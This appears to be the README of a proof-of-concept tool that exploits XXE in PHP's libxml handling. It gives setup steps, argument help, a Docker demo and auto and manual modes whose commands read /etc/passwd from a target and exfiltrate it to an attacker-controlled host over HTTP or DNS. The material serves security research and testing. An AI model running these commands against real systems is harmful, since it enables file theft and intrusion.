PoC tool to demonstrate XXE in PHP with only `LIBXML_DTDLOAD` or `LIBXML_DTDATTR` flag set

## Usage

### Setup
```sh
git clone https://github.com/bytehope/wwe.git
cd wwe
pip install -r requirements.txt
```

### Tool arguments

List of allowed tool arguments
```sh
usage: wwe.py [-h] -f FILENAME [-l LENGTH] [--dns-exf | --no-dns-exf] [--decode | --no-decode] exfiltrate_url {AUTO,MANUAL} ...

positional arguments:
  exfiltrate_url
  {AUTO,MANUAL}

options:
  -h, --help            show this help message and exit
  -f FILENAME, --filename FILENAME
                        the name of the file whose content we want to get
  -l LENGTH, --length LENGTH
                        each request will retrieve l-bytes in b64. Increase this param will be huge increase payload size
  --dns-exf, --no-dns-exf
                        enable/disable exfiltration over DNS (default: False)
  --decode, --no-decode
                        Inline decode to b64 in output
```

### Demo
To set up a test environment, run the docker compose.
```sh
docker compose -f ./demo/compose.yaml up -d
```

Then execute the script
```sh
python3 wwe.py -f /etc/passwd --decode http://172.30.0.1:9999 AUTO ./demo/demo-request.txt -u http://localhost:1337/
```

Stop Docker and remove the network
```sh
docker compose -f ./demo/compose.yaml down -v
```

### Modes
#### Auto
It listens to the port itself and sends data to a vulnerable route using a txt file,
example: 
```sh
python3 wwe.py -f /etc/passwd --decode http://EXF_HOST:LISTEN_PORT AUTO REQUEST_IN_FILE.txt -u http://TARGET/
```

#### Manual
Generates a payload on each chunk of data, waiting for input to generate the next payload:
```sh
python3 wwe.py -f /etc/passwd --decode http://EXF_HOST_WITH_PORT MANUAL
```

### TODO:
- output data into file
- enable/disable live mode
- improved live view for other modes
- full-auto DNS mode
